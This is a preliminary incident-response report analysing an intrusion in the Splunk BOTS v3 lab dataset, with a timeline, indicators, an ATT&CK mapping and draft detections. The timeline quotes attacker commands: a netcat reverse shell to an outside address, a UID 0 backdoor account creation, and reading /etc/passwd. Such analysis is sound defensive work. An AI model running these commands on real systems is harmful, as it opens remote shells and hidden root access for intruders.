# INC-001: Hands-on-keyboard intrusion across FYODOR-L and hoth

| Field | Value |
|---|---|
| Status | Preliminary (analysis in progress) |
| Dataset | Splunk BOTS v3, `index=botsv3` |
| Event date | 2018-08-20 (times are as displayed in Splunk; Linux log lines and Sysmon UTC are 4 hours ahead) |
| Hosts involved | FYODOR-L (Windows), hoth / 192.168.9.30 (Linux) |
| External address | 45.77.53.176 |
| Analysis performed | 2026-11-25, Splunk Enterprise lab |

Confidence labels: **Confirmed** = directly seen in log fields. **Likely** = inferred from several consistent log sources. **Open** = not yet verified.

## 1. Summary

A hidden, encoded PowerShell process on FYODOR-L (user `AzureAD\FyodorMalteskesko`) created a local administrator account named `svcvnc` at 06:08. The same PowerShell process was in contact with 45.77.53.176 from 06:01 until at least 07:59. At 06:47 a tool named `iexeplorer.exe` was written to `C:\Windows\Temp\unziped\lsof-master\`. From 07:05 that tool sent Linux commands to a web application on 192.168.9.30 (`hoth`): reconnaissance, an account-creation command, staging of a kernel privilege-escalation source file, and a netcat reverse shell to 45.77.53.176:8088.

hoth's `/var/log/auth.log` confirms an effect on the Linux host: at 07:24:44 `useradd` created the account `tomcat7` with UID 0 and GID 0 (root-equivalent). The logs do not show which process or channel ran it, or whether the kernel exploit was compiled and executed.

## 2. Timeline

| Time | Host | Event | Confidence |
|---|---|---|---|
| 05:45:19 | FYODOR-L, hoth | HTTP traffic containing `showcase.action` in `stream:http`. Purpose unknown (may be normal application use) | Open |
| 05:48:17 | splunk.froth.ly, matar | 45.77.53.176 appears in O365 message trace (8 events) and `stream:smtp` (4 events). Meaning unknown | Open |
| 06:01 | ABUNGST-L, FYODOR-L | First DNS and Sysmon records containing 45.77.53.176 (06:01:03 and 06:01:46) | Confirmed |
| 06:08:17 | FYODOR-L | `net user /add svcvnc [REDACTED]` run by net.exe / net1.exe; parent is `powershell.exe -NoP -NonI -W Hidden -enc ...` | Confirmed |
| 06:08:35 | FYODOR-L | `net localgroup administrators svcvnc /add`, same PowerShell parent (PID 6360), same logon session | Confirmed |
| 06:24:58 | hoth | The string `tomcat7` appears in `unix:useraccounts` and `userswithloginprivs` (content not yet read). This conflicts with the 07:24:44 "new user" log, which implies the name was new | Open |
| 06:45:03 | FYODOR-L | One PowerShell/Operational event mentions 192.168.9.30 (not yet reviewed) | Open |
| 06:47:41 | FYODOR-L | powershell.exe created `lsof-master\powershell.exe` and `lsof-master\iexeplorer.exe` in `C:\Windows\Temp\unziped\` (Sysmon EventID 11) | Confirmed |
| 07:00:04 to 07:01:55 | hoth | SSH password logins for user `klagerfield` from 192.168.8.109 and 192.168.8.117, each followed by `sudo /bin/bash` as root. Relation to the intrusion unknown (may be routine administration) | Open |
| 07:05:40 to 07:07:46 | FYODOR-L to hoth | `iexeplorer.exe` run against `http://192.168.9.30:8080/frothlyinventory/showcase.action` with: `whoami`, `id`, `groups`, `cat /etc/passwd`, `useradd -ou 0 -g 0 ... tomcat7 -p [REDACTED]`, `uname -a`, `lsb_release -a` | Confirmed (commands sent) |
| 07:08:36 to 07:11:46 | FYODOR-L to hoth | Base64 text written to `/tmp/colonel`, decoded to `/tmp/colonel.c`, then `cat` and `md5sum`. Header comment indicates a public Ubuntu 16.04.4 kernel privilege-escalation exploit | Confirmed (commands); exploit identity partly verified |
| 07:09:48 | FYODOR-L to hoth | Base64 data with a JPEG header written to an unreviewed destination | Open |
| about 07:13:56 | FYODOR-L, firewall, hoth | Events containing 45.77.53.176 on FYODOR-L Security (07:13:56), Cisco ASA (07:13:57) and hoth `stream:http` (07:13:57); hoth `ps` from 07:14:24, `netstat` from 07:14:54 | Likely first reverse-shell attempt |
| 07:24:44 | hoth | `useradd[12815]: new user: name=tomcat7, UID=0, GID=0, home=/home/tomcat7, shell=/bin/bash`. No sudo or SSH login entry for this action in `auth.log` between 07:00 and 07:45 | Confirmed (account created); channel unknown |
| 07:33:46 | FYODOR-L to hoth | `mknod /tmp/backpipe p` | Confirmed |
| 07:34:01 | FYODOR-L to hoth | `/bin/sh 0</tmp/backpipe \| nc 45.77.53.176 8088 1>/tmp/backpipe` | Confirmed |
| up to 07:59 | FYODOR-L, hoth | Sysmon and `ps` still contain 45.77.53.176 | Confirmed |

## 3. Key findings

**Confirmed**
- `svcvnc` appears in 15 events (11 Security, 4 Sysmon), all between 06:08:17 and 06:08:35. No later activity under that name was found in botsv3.
- FYODOR-L Sysmon shows 3,850 network connections (EventID 3) from `powershell.exe` involving 45.77.53.176, from 06:01:46 to 07:59:36.
- 45.77.53.176 also appears on ABUNGST-L (1,070 Sysmon events, 06:01:04 to 07:59:24), on hoth (`netstat`, `ps`, `osquery:results`, `stream:http`) and in the Cisco ASA logs.
- Decoded fragments of the encoded PowerShell show `https://45.77.53.176:443`, the path `/admin/get.php` and an Internet Explorer 11 user-agent string. Only fragments were decoded, not the whole script.
- `192.168.9.30` is `hoth`: `interfaces` data shows `ens33` with `192.168.9.30/24`, MAC `00:0c:29:fb:12:05`.
- hoth runs an Ubuntu 16.04 package set with `gcc` installed.
- A UID 0 account `tomcat7` was created on hoth at 07:24:44 (`auth.log`).

**Likely**
- The `nc` command ran twice (about 07:13:56 and 07:34:01). Sysmon shows 34 process-creation events (about 17 executions) but only 15 distinct commands, and `dedup` hid the repeats. Re-check without `dedup`.
- The command pattern (URL ending in `.action`, then shell commands) is consistent with remote command execution against a Java web application such as Apache Struts. The specific vulnerability is not identified.
- The `useradd` at 07:24:44 was run with root rights through a channel other than `sudo` (none logged). A reverse shell plus privilege escalation is consistent with this but not proven.

## 4. Open questions

1. What do the 06:24:58 and 07:48:24 `tomcat7` records contain (UID, existence)? If the account existed before 07:24:44, why did `useradd` log a new user?
2. Which channel ran `useradd` at 07:24:44? The deduplicated Sysmon list shows the `useradd` command only at 07:07:03. Re-list all `iexeplorer.exe` commands without `dedup`.
3. What is the exact kernel version on hoth, and is it in the range affected by the exploit? Was `/tmp/colonel.c` compiled and run?
4. Where was the JPEG-header data written (07:09:48)?
5. What triggered the first contact with 45.77.53.176 on ABUNGST-L (06:01:03) and FYODOR-L (06:01:46)? What is the link to the 05:48 mail events?
6. Which hosts are 192.168.8.109 and 192.168.8.117, and are the `klagerfield` sessions at 07:00 related to this activity? JWORTOS-L, MKRAEUS-L and BSTOLL-L reference 192.168.9.30 between 06:52 and 07:00; a link is a hypothesis only.
7. What was the 06:45:03 PowerShell/Operational event, and where did the archive in `Temp\unziped` come from?
8. Was the FYODOR-L user account used by an attacker or did the user run the tooling?

## 5. Indicators of compromise

| Type | Value |
|---|---|
| IP | 45.77.53.176 (TCP 443 from PowerShell, TCP 8088 reverse shell) |
| URL path | `/admin/get.php` |
| Internal URL used for commands | `http://192.168.9.30:8080/frothlyinventory/showcase.action` |
| File | `C:\Windows\Temp\unziped\lsof-master\iexeplorer.exe` |
| SHA256 | `EC732909362C261F3D7DF4A1D68BAA0133509FB36DD870658B0081108E1FA838` |
| File | `C:\Windows\Temp\unziped\lsof-master\powershell.exe` (hash not collected) |
| Windows account | `FYODOR-L\svcvnc` |
| Linux account | `tomcat7` with UID 0, created 07:24:44 on hoth |
| Linux paths | `/tmp/colonel`, `/tmp/colonel.c`, `/tmp/backpipe` |
| Command-line pattern | `powershell.exe -NoP -NonI -W Hidden -enc` |

## 6. MITRE ATT&CK mapping (candidates)

| Technique | Evidence |
|---|---|
| T1059.001 PowerShell | Hidden encoded PowerShell parent |
| T1027 Obfuscated files or information | Base64-encoded command |
| T1136.001 Create account: local | `svcvnc` on FYODOR-L; `tomcat7` (UID 0) on hoth |
| T1098 Account manipulation | `net localgroup administrators svcvnc /add` |
| T1036.005 Masquerading | `iexeplorer.exe` and a copy named `powershell.exe` in `Temp` |
| T1059.004 Unix shell | Commands sent to hoth |
| T1033, T1082, T1087 Discovery | `whoami`, `uname -a`, `cat /etc/passwd` |
| T1068 Exploitation for privilege escalation | Kernel exploit source staged; root-level action at 07:24:44 is consistent but execution is not verified |
| T1571 Non-standard port | Reverse shell to port 8088 |

## 7. Detections

| ID | Purpose | Status |
|---|---|---|
| 001 | Local account created and added to Administrators within 600 seconds | Validated: one hit (`svcvnc`, 18 seconds apart) |
| 002 | Hidden encoded PowerShell parent spawning `net user /add` or `net localgroup administrators /add` | Draft, not yet validated |
| 003 | Binary under `\Temp\` with a URL ending in `.action` in its command line | Draft, not yet validated |
| 004 | Very high count of `powershell.exe` connections to one external address | Idea |
| 005 | Linux `useradd` creating a UID 0 account: `source="/var/log/auth.log" useradd "new user" "UID=0"` | Draft; the matching event was found by a different search |

Sysmon fields are not extracted in this lab, so draft searches use `rex` on `_raw`.

## 8. Recommended response (if this were production)

1. Isolate FYODOR-L and hoth; preserve memory and disk images.
2. Block 45.77.53.176 at the firewall and search for it across all hosts, including ABUNGST-L.
3. Disable `svcvnc`; review members of local Administrators on all Windows hosts.
4. On hoth, remove the UID 0 `tomcat7` account, review `/tmp`, cron jobs and SSH keys, and rebuild the host if root compromise is confirmed.
5. Review the web application patch level on 192.168.9.30:8080.
6. Reset credentials for `FyodorMalteskesko` and review the `klagerfield` sessions; investigate how the encoded PowerShell was first launched.

## 9. Handling notes

- The password in the original command lines is replaced with `[REDACTED]`.
- Base64 exploit text and the encoded PowerShell are intentionally not reproduced.
- Counts and times come from Splunk searches run in this lab on BOTS v3 data; searches that returned zero events do not prove the absence of activity.
